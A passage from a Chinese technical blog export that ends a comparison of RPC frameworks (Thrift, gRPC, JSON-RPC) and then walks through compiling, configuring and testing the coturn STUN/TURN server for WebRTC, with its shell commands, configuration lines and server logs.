<li>TCompactProtocol – 更紧凑的二进制格式，处理起来通常同样高效。</li>
<li>TDebugProtocol – 一种人类可读的文本格式，用来协助调试。</li>
<li>TDenseProtocol – 与TCompactProtocol类似，将传输数据的元信息剥离。</li>
<li>TJSONProtocol – 使用JSON对数据编码。</li>
<li>TSimpleJSONProtocol – 一种只写协议，它不能被Thrift解析，因为它使用JSON时丢弃了元数据。适合用脚本语言来解析。</li>
</ul>
<h2 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h2><p>gRPC是由Google主导开发的RPC框架，使用HTTP/2协议并用ProtoBuf作为序列化工具（ProtoBuf的数据是二进制），gRPC和Thrift功能很类似，也是集成了序列化/反序列化和传输层。通过 <code>.proto</code>文件直接生成客户端和服务端的代码，支持的语言有：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C++, Java, Python, PHP, Ruby, C#, Node.js, Go, Android Java, Objective-C, Dart, Web</span><br></pre></td></tr></table></figure></p>
<p>其中Java的传输层是基于Netty的，Android Java是基于OkHttp。可以看到gRPC不局限于后端微服务的连接，它是支持移动设备端的，完全可以将移动设备、浏览器客户端连接到后端服务，取代目前普遍使用的HTTP RESTful API，免去客户端开发者要编写API接口代码。</p>
<h2 id="Netty-ProtoBuf"><a href="#Netty-ProtoBuf" class="headerlink" title="Netty + ProtoBuf"></a>Netty + ProtoBuf</h2><p>觉得这是一种不成熟的RPC方案，个人练手练手是不错的选择。但是基于这两货，厉害的开发者可以开发出一套RPC软件。<br>Netty自带ProtoBuf的解码器，所以，通过ProtoBuf序列化/反序列化数据，使用Netty来传输非常方便，<code>gRPC-java</code> 就是基于 <code>Netty + ProtoBuf</code> 实现的。</p>
<h2 id="JSON-RPC"><a href="#JSON-RPC" class="headerlink" title="JSON-RPC"></a>JSON-RPC</h2><p>是一种基于JSON的跨语言远程调用协议，<a href="http://wiki.geekdream.com/Specification/json-rpc_2.0.html" target="_blank" rel="noopener">JSON-RPC 2.0 规范</a>这样描述：</p>
<blockquote>
<p>JSON-RPC是一个无状态且轻量级的远程过程调用(RPC)协议。 本规范主要定义了一些数据结构及其相关的处理规则。它允许运行在基于socket,http等诸多不同消息传输环境的同一进程中。其使用JSON（RFC 4627）作为数据格式。 </p>
</blockquote>
<p>认识 JSON-RPC 是以太坊的接口，以太坊的接口基于 HTTP 来实现。JSON-RPC 和 ProtoBuf 是同一层，只定义数据，不参与数据传输。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>RPC（Remote Procedure Call）—远程过程调用，多用于分布式环境下，该协议允许运行于一台计算机的程序通过网络调用另一台计算机的程序，而程序员无需额外地为这个交互作用编程。</p>
<p>RPC与数据格式，传输方式。传输方式比如上述有TCP也有HTTP，甚至还有UDP。</p>
<p>为什么选择RPC ？</p>
<ul>
<li><p>提高开发效率，开发人员可以把更多精力放在具体的接口实现，而不必考虑数据的底层传输问题</p>
</li>
<li><p>大多数rpc框架都是很多优秀开发人员的智慧结晶，它们的功能实现和执行效率都很优秀</p>
</li>
<li><p>client端和server端必须遵循统一的接口规范，避免产生client和server之间接口或数据局结构不匹配的情况。</p>
</li>
</ul>
<p>gRPC 和 Thrift 都提供了代码生成和维护传输层，程序猿只需要关心接口定义和调用，对开发效率很有帮助。</p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>WebRTC STUN&amp;TURN 服务器</title>
    <url>/Web%E5%90%8E%E7%AB%AF/WebRTC%20TURN&amp;STUN%20%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>coturn</code> 是一个开源的 <code>TURN/STUN</code> 服务器，支持 P2P 穿透。</p>
<ul>
<li>STUN 服务器用于获取设备的外部网络地址</li>
<li>TURN 服务器是在点对点失败后用于通信中继。</li>
</ul>
<p>WebRTC 建立连接的步骤大概是这样的：</p>
<ol>
<li>客户端（浏览器）直接尝试直连；</li>
<li>如果如果直连则通过 STUN 服务器进行穿透；</li>
<li>如果无法穿透则通过 TURN 服务器进行中转。</li>
</ol>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><ol>
<li><p>安装编译依赖工具</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install build-essential libssl-dev openssl</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意apt安装的openssl版本可能太老，会导致编译coturn失败，可以源码安装新版本openssl，参考【<a href="../../Linux/Ubuntu%2016.04%20LTS安装新版OpenSSL/">Ubuntu 16.04 LTS安装新版OpenSSL</a>】</p>
</blockquote>
</li>
<li><p>安装依赖库libevent<br>源码安装才是新版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ wget https://github.com/libevent/libevent/releases</span><br><span class="line">/download/release-2.1.10-stable/libevent-2.1.10-stable.tar.gz</span><br><span class="line">$ tar -zxvf libevent-2.1.10-stable.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> libevent-2.1.10-stable</span><br><span class="line">$ ./configure</span><br><span class="line">$ make &amp; make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装数据库依赖sqlite<br>这一步可以跳过，如果在这里安装sqlite的话，安装coturn会自动检查到。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install sqlite libsqlite3-dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装coturn</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ wget https://github.com/coturn/coturn/archive/4.5.1.1.tar.gz</span><br><span class="line">$ tar -zxvf 4.5.1.1.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> coturn-4.5.1.1</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com.cnpmjs.org/coturn/coturn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译安装</span></span><br><span class="line"><span class="comment"># 4.5.1.1</span></span><br><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">install -d /usr/<span class="built_in">local</span></span><br><span class="line">install -d /usr/<span class="built_in">local</span>/bin</span><br><span class="line">install -d /usr/<span class="built_in">local</span>/var/db</span><br><span class="line">install -d /usr/<span class="built_in">local</span>/man/man1</span><br><span class="line">install -d /usr/<span class="built_in">local</span>/etc</span><br><span class="line">install -d /usr/<span class="built_in">local</span>/lib</span><br><span class="line">install -d /usr/<span class="built_in">local</span>/share/examples/turnserver</span><br><span class="line">install -d /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install -d /usr/<span class="built_in">local</span>/share/turnserver</span><br><span class="line">install -d /usr/<span class="built_in">local</span>/include/turn</span><br><span class="line">install bin/turnserver /usr/<span class="built_in">local</span>/bin</span><br><span class="line">install bin/turnadmin /usr/<span class="built_in">local</span>/bin</span><br><span class="line">install bin/turnutils_uclient /usr/<span class="built_in">local</span>/bin</span><br><span class="line">install bin/turnutils_peer /usr/<span class="built_in">local</span>/bin</span><br><span class="line">install bin/turnutils_stunclient /usr/<span class="built_in">local</span>/bin</span><br><span class="line">install bin/turnutils_oauth /usr/<span class="built_in">local</span>/bin</span><br><span class="line">install bin/turnutils_natdiscovery /usr/<span class="built_in">local</span>/bin</span><br><span class="line">install man/man1/turnserver.1 /usr/<span class="built_in">local</span>/man/man1/</span><br><span class="line">install man/man1/turnadmin.1 /usr/<span class="built_in">local</span>/man/man1/</span><br><span class="line">install man/man1/turnutils.1 /usr/<span class="built_in">local</span>/man/man1/</span><br><span class="line">install man/man1/turnutils_uclient.1 /usr/<span class="built_in">local</span>/man/man1/</span><br><span class="line">install man/man1/turnutils_stunclient.1 /usr/<span class="built_in">local</span>/man/man1/</span><br><span class="line">install man/man1/turnutils_oauth.1 /usr/<span class="built_in">local</span>/man/man1/</span><br><span class="line">install man/man1/turnutils_natdiscovery.1 /usr/<span class="built_in">local</span>/man/man1/</span><br><span class="line">install man/man1/turnutils_peer.1 /usr/<span class="built_in">local</span>/man/man1/</span><br><span class="line">install man/man1/coturn.1 /usr/<span class="built_in">local</span>/man/man1/</span><br><span class="line">install lib/libturnclient.a /usr/<span class="built_in">local</span>/lib</span><br><span class="line">install LICENSE /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install README.turnserver /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install README.turnadmin /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install README.turnutils /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install INSTALL /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install postinstall.txt /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install turndb/schema.sql /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install turndb/schema.sql /usr/<span class="built_in">local</span>/share/turnserver</span><br><span class="line">install turndb/schema.mongo.sh /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install turndb/schema.mongo.sh /usr/<span class="built_in">local</span>/share/turnserver</span><br><span class="line">install turndb/testredisdbsetup.sh /usr/<span class="built_in">local</span>/share/turnserver</span><br><span class="line">install turndb/testmongosetup.sh /usr/<span class="built_in">local</span>/share/turnserver</span><br><span class="line">install turndb/testsqldbsetup.sql /usr/<span class="built_in">local</span>/share/turnserver</span><br><span class="line">install turndb/schema.userdb.redis /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install turndb/schema.userdb.redis /usr/<span class="built_in">local</span>/share/turnserver</span><br><span class="line">install turndb/schema.stats.redis /usr/<span class="built_in">local</span>/share/doc/turnserver</span><br><span class="line">install turndb/schema.stats.redis /usr/<span class="built_in">local</span>/share/turnserver</span><br><span class="line"><span class="keyword">if</span> [ -f sqlite/turndb ] ; <span class="keyword">then</span> install sqlite/turndb /usr/<span class="built_in">local</span>/var/db/turndb;</span><br><span class="line"><span class="keyword">fi</span> install examples/etc/turnserver.conf /usr/<span class="built_in">local</span>/etc/turnserver.conf.default</span><br><span class="line">cp -rpf examples/etc /usr/<span class="built_in">local</span>/share/examples/turnserver</span><br><span class="line">cp -rpf examples/scripts /usr/<span class="built_in">local</span>/share/examples/turnserver</span><br><span class="line">rm -rf /usr/<span class="built_in">local</span>/share/examples/turnserver/scripts/rfc5769.sh</span><br><span class="line">cp -rpf include/turn/client /usr/<span class="built_in">local</span>/include/turn</span><br><span class="line">install include/turn/ns_turn_defs.h /usr/<span class="built_in">local</span>/include/turn</span><br><span class="line">cat /usr/<span class="built_in">local</span>/share/doc/turnserver/postinstall.txt</span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">1) If your system supports automatic start-up system daemon services, </span><br><span class="line"><span class="keyword">then</span> to <span class="built_in">enable</span> the turnserver as a system service that is automatically</span><br><span class="line">started, you have to:</span><br><span class="line"></span><br><span class="line">	a) Create and edit /etc/turnserver.conf or </span><br><span class="line">	/usr/<span class="built_in">local</span>/etc/turnserver.conf . </span><br><span class="line">	Use /usr/<span class="built_in">local</span>/etc/turnserver.conf.default as an example.</span><br><span class="line"></span><br><span class="line">	b) For user accounts settings: <span class="built_in">set</span> up SQLite or PostgreSQL or </span><br><span class="line">	MySQL or MongoDB or Redis database <span class="keyword">for</span> user accounts.</span><br><span class="line">	Use /usr/<span class="built_in">local</span>/share/turnserver/schema.sql as SQL database schema,</span><br><span class="line">	or use /usr/<span class="built_in">local</span>/share/turnserver/schema.userdb.redis as Redis</span><br><span class="line">	database schema description and/or </span><br><span class="line">	/usr/<span class="built_in">local</span>/share/turnserver/schema.stats.redis</span><br><span class="line">	as Redis status &amp; statistics database schema description.</span><br><span class="line">	</span><br><span class="line">	If you are using SQLite, the default database location is <span class="keyword">in</span> </span><br><span class="line">	/var/db/turndb or <span class="keyword">in</span> /usr/<span class="built_in">local</span>/var/db/turndb or <span class="keyword">in</span> /var/lib/turn/turndb</span><br><span class="line">	 </span><br><span class="line">	c) add whatever is necessary to <span class="built_in">enable</span> start-up daemon <span class="keyword">for</span> the </span><br><span class="line">	/usr/<span class="built_in">local</span>/bin/turnserver.</span><br><span class="line">     </span><br><span class="line">2) If you <span class="keyword">do</span> not want the turnserver to be a system service, </span><br><span class="line">   <span class="keyword">then</span> you can start/stop it <span class="string">"manually"</span>, using the <span class="string">"turnserver"</span> </span><br><span class="line">   executable with appropriate options (see the documentation).</span><br><span class="line">   </span><br><span class="line">3) To create database schema, use schema <span class="keyword">in</span> file </span><br><span class="line">/usr/<span class="built_in">local</span>/share/turnserver/schema.sql.</span><br><span class="line">   </span><br><span class="line">4) For additional information, run:</span><br><span class="line"> </span><br><span class="line">   $ man turnserver</span><br><span class="line">   $ man turnadmin</span><br><span class="line">   $ man turnutils</span><br><span class="line">	</span><br><span class="line">==================================================================</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置coturn（重点）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/etc</span><br><span class="line">$ cp turnserver.conf.default  turnserver.conf</span><br><span class="line">$ openssl req -x509 -newkey rsa:2048 -keyout </span><br><span class="line">  turn_server_pkey.pem -out turn_server_cert.pem -days 99999 -nodes </span><br><span class="line"></span><br><span class="line">$ ifconfig -a</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.0.115  netmask 255.255.255.0  broadcast 192.168.0.255</span><br><span class="line">        inet6 fe80::5632:dfa1:378e:7570  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:6c:a8:71  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 5037  bytes 6248464 (6.2 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 2856  bytes 226651 (226.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 1137  bytes 93030 (93.0 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 1137  bytes 93030 (93.0 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p> 无数据库配置，<a href="https://www.jianshu.com/p/915eab39476d" target="_blank" rel="noopener">【配置参考】</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo vim turnserver.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#与前ifconfig查到的网卡名称一致</span></span><br><span class="line">relay-device=ens33</span><br><span class="line"><span class="comment">#内网IP</span></span><br><span class="line">listening-ip=192.168.0.115</span><br><span class="line">listening-port=3478</span><br><span class="line">tls-listening-port=5349</span><br><span class="line">relay-ip=192.168.0.115</span><br><span class="line"><span class="comment">#公网IP</span></span><br><span class="line">external-ip=192.168.0.115</span><br><span class="line">relay-threads=10</span><br><span class="line">lt-cred-mech</span><br><span class="line">cert=/usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">pkey=/usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">pidfile=<span class="string">"/var/run/turnserver.pid"</span></span><br><span class="line">min-port=49152</span><br><span class="line">max-port=65535</span><br><span class="line"><span class="comment">#用户名密码，创建IceServer时用</span></span><br><span class="line">user=<span class="built_in">test</span>:123456</span><br><span class="line">cli-password=123456</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ sudo turnserver -o -a -f -v -user=<span class="built_in">test</span>:123456 -r MYTest</span><br><span class="line">0: <span class="built_in">log</span> file opened: /var/<span class="built_in">log</span>/turn_38651_2021-08-03.log</span><br><span class="line">0: Listener address to use: 127.0.0.1</span><br><span class="line">0: Relay address to use: 127.0.0.1</span><br><span class="line">0: Config file found: /usr/<span class="built_in">local</span>/etc/turnserver.conf</span><br><span class="line">0: </span><br><span class="line">RFC 3489/5389/5766/5780/6062/6156 STUN/TURN Server</span><br><span class="line">Version Coturn-4.5.1.1 <span class="string">'dan Eider'</span></span><br><span class="line">0: </span><br><span class="line">Max number of open files/sockets allowed <span class="keyword">for</span> this process: 1048576</span><br><span class="line">0: </span><br><span class="line">Due to the open files/sockets limitation,</span><br><span class="line">max supported number of TURN Sessions possible is: 524000 (approximately)</span><br><span class="line">0: </span><br><span class="line"></span><br><span class="line">==== Show him the instruments, Practical Frost: ====</span><br><span class="line"></span><br><span class="line">0: TLS supported</span><br><span class="line">0: DTLS supported</span><br><span class="line">0: DTLS 1.2 supported</span><br><span class="line">0: TURN/STUN ALPN supported</span><br><span class="line">0: Third-party authorization (oAuth) supported</span><br><span class="line">0: GCM (AEAD) supported</span><br><span class="line">0: OpenSSL compile-time version: OpenSSL 1.1.1j  16 Feb 2021 (0x101010af)</span><br><span class="line">0: </span><br><span class="line">0: SQLite supported, default database location is /usr/<span class="built_in">local</span>/var/db/turndb</span><br><span class="line">0: Redis is not supported</span><br><span class="line">0: PostgreSQL is not supported</span><br><span class="line">0: MySQL is not supported</span><br><span class="line">0: MongoDB is not supported</span><br><span class="line">0: </span><br><span class="line">0: Default Net Engine version: 3 (UDP thread per CPU core)</span><br><span class="line"></span><br><span class="line">=====================================================</span><br><span class="line"></span><br><span class="line">0: Domain name: </span><br><span class="line">0: Default realm: MyTest</span><br><span class="line">0: SSL23: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: SSL23: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: TLS1.0: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: TLS1.0: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: TLS1.1: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: TLS1.1: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: TLS1.2: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: TLS1.2: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: TLS cipher suite: DEFAULT</span><br><span class="line">0: DTLS: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: DTLS: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: DTLS1.2: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: DTLS1.2: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: DTLS cipher suite: DEFAULT</span><br><span class="line"></span><br><span class="line">$ ps -ef|grep turnserve</span><br><span class="line">root      100411   turnserver -o -a -f -v -user=<span class="built_in">test</span>:123456 -r MYTest</span><br><span class="line"></span><br><span class="line">$ sudo lsof -i :3478</span><br><span class="line">COMMAND      PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">turnserve 100411 root   13u  IPv4 331035      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100411 root   21u  IPv4 331040      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100411 root   29u  IPv4 331045      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100411 root   37u  IPv4 331050      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100411 root   45u  IPv4 331055      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100411 root   53u  IPv4 331060      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100411 root   61u  IPv4 331065      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100411 root   69u  IPv4 331070      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100411 root   77u  IPv4 331075      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100411 root   84u  IPv4 330096      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100411 root   86u  IPv4 330097      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100411 root   87u  IPv4 330098      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100411 root   88u  IPv4 331080      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100411 root   91u  IPv4 330099      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100411 root   92u  IPv4 330100      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100411 root   93u  IPv4 330101      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100411 root   94u  IPv4 330102      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100411 root   95u  IPv4 330103      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100411 root   96u  IPv4 330104      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100411 root   97u  IPv4 330105      0t0  UDP localhost:3478 </span><br><span class="line"></span><br><span class="line">有输出监听端口的信息说明已经成功启动</span><br></pre></td></tr></table></figure>
<p> 有Sqlite配置，<a href="https://www.cnblogs.com/yjmyzz/p/how-to-install-coturn-on-ubuntu.html" target="_blank" rel="noopener">【配置参考】</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$ sudo turnadmin -a -u <span class="built_in">test</span> -p 123456 -r demo</span><br><span class="line"></span><br><span class="line">$ sudo vim turnserver.conf</span><br><span class="line"> <span class="comment">#监听端口</span></span><br><span class="line">listening-port=3478</span><br><span class="line"><span class="comment">#监听的网卡</span></span><br><span class="line">listening-device=ens33</span><br><span class="line"><span class="comment">#公网ip</span></span><br><span class="line">external-ip=192.168.0.115</span><br><span class="line"><span class="comment">#用户名:密码</span></span><br><span class="line">user=<span class="built_in">test</span>:123456</span><br><span class="line"><span class="comment">#一般与turnadmin创建用户时指定的realm一致</span></span><br><span class="line">realm=demo</span><br><span class="line">cli-password=123456</span><br><span class="line"></span><br><span class="line">$ sudo turnserver -o -a -f -user=<span class="built_in">test</span>:123456 -v -r demo</span><br><span class="line">0: <span class="built_in">log</span> file opened: /var/<span class="built_in">log</span>/turn_99525_2021-08-04.log</span><br><span class="line">0: Config file found: /usr/<span class="built_in">local</span>/etc/turnserver.conf</span><br><span class="line">0: </span><br><span class="line">RFC 3489/5389/5766/5780/6062/6156 STUN/TURN Server</span><br><span class="line">Version Coturn-4.5.1.1 <span class="string">'dan Eider'</span></span><br><span class="line">0: </span><br><span class="line">Max number of open files/sockets allowed <span class="keyword">for</span> this process: 1048576</span><br><span class="line">0: </span><br><span class="line">Due to the open files/sockets limitation,</span><br><span class="line">max supported number of TURN Sessions possible is: 524000 (approximately)</span><br><span class="line">0: </span><br><span class="line"></span><br><span class="line">==== Show him the instruments, Practical Frost: ====</span><br><span class="line"></span><br><span class="line">0: TLS supported</span><br><span class="line">0: DTLS supported</span><br><span class="line">0: DTLS 1.2 supported</span><br><span class="line">0: TURN/STUN ALPN supported</span><br><span class="line">0: Third-party authorization (oAuth) supported</span><br><span class="line">0: GCM (AEAD) supported</span><br><span class="line">0: OpenSSL compile-time version: OpenSSL 1.1.1j  16 Feb 2021 (0x101010af)</span><br><span class="line">0: </span><br><span class="line">0: SQLite supported, default database location is /usr/<span class="built_in">local</span>/var/db/turndb</span><br><span class="line">0: Redis is not supported</span><br><span class="line">0: PostgreSQL is not supported</span><br><span class="line">0: MySQL is not supported</span><br><span class="line">0: MongoDB is not supported</span><br><span class="line">0: </span><br><span class="line">0: Default Net Engine version: 3 (UDP thread per CPU core)</span><br><span class="line"></span><br><span class="line">=====================================================</span><br><span class="line"></span><br><span class="line">0: Domain name: </span><br><span class="line">0: Default realm: demo</span><br><span class="line">0: Config file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: Config file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: SSL23: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: SSL23: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: TLS1.0: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: TLS1.0: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: TLS1.1: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: TLS1.1: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: TLS1.2: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: TLS1.2: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: TLS cipher suite: DEFAULT</span><br><span class="line">0: DTLS: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: DTLS: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: DTLS1.2: Certificate file found: /usr/<span class="built_in">local</span>/etc/turn_server_cert.pem</span><br><span class="line">0: DTLS1.2: Private key file found: /usr/<span class="built_in">local</span>/etc/turn_server_pkey.pem</span><br><span class="line">0: ERROR: set_ctx: ERROR: cannot <span class="built_in">set</span> DH</span><br><span class="line">0: DTLS cipher suite: DEFAULT</span><br><span class="line">0: NO EXPLICIT LISTENER ADDRESS(ES) ARE CONFIGURED</span><br><span class="line">0: ===========Discovering listener addresses: =========</span><br><span class="line">0: Listener address to use: 127.0.0.1</span><br><span class="line">0: Listener address to use: 192.168.0.115</span><br><span class="line">0: Listener address to use: ::1</span><br><span class="line">0: =====================================================</span><br><span class="line">0: Total: 1 <span class="string">'real'</span> addresses discovered</span><br><span class="line">0: =====================================================</span><br><span class="line">0: NO EXPLICIT RELAY ADDRESS(ES) ARE CONFIGURED</span><br><span class="line">0: ===========Discovering relay addresses: =============</span><br><span class="line">0: Relay address to use: 192.168.0.115</span><br><span class="line">0: Relay address to use: ::1</span><br><span class="line">0: =====================================================</span><br><span class="line">0: Total: 2 relay addresses discovered</span><br><span class="line">0: =====================================================</span><br><span class="line"></span><br><span class="line">$ ps -ef|grep turnserve</span><br><span class="line">root      100608  turnserver -o -a -f -user=<span class="built_in">test</span>:123456 -v -r demo</span><br><span class="line"></span><br><span class="line">$ sudo lsof -i :3478</span><br><span class="line">COMMAND      PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">turnserve 100608 root   13u  IPv4 330422      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100608 root   17u  IPv4 330426      0t0  TCP ubuntu:3478 (LISTEN)</span><br><span class="line">turnserve 100608 root   27u  IPv4 333118      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100608 root   28u  IPv4 330433      0t0  TCP localhost:3478 (LISTEN)</span><br><span class="line">turnserve 100608 root   29u  IPv4 333119      0t0  UDP localhost:3478 </span><br><span class="line">turnserve 100608 root   34u  IPv4 333122      0t0  UDP ubuntu:3478 </span><br><span class="line">turnserve 100608 root   36u  IPv4 333123      0t0  UDP ubuntu:3478 </span><br><span class="line">turnserve 100608 root   38u  IPv4 330437      0t0  TCP ubuntu:3478 (LISTEN)</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试<br><a href="https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/" target="_blank" rel="noopener">webrtc-samples提供的测工具</a><br>测试环境：</p>
</li>
</ol>
<ul>
<li>coturn服务运行在一台“桥接网络适配器”VMWare虚拟机上,网段是192.168.0.1和宿主机一样。</li>
<li>在一台“Net网络适配器”VMWare虚拟机测试ICE，网段是192.168.58.123相当于一个小局域网，结果如图：<br><img src="/images/Web后端/TrickleICE.png" alt="VMWare Net网络适配器测试结果"><br>没有测试出relay效果，只是测试出来了本地网络，coturn还是得部署到公网IP的服务器上才行。<blockquote>
<p>部署到云服务器时记得开放UDP和TCP的3478端口。</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
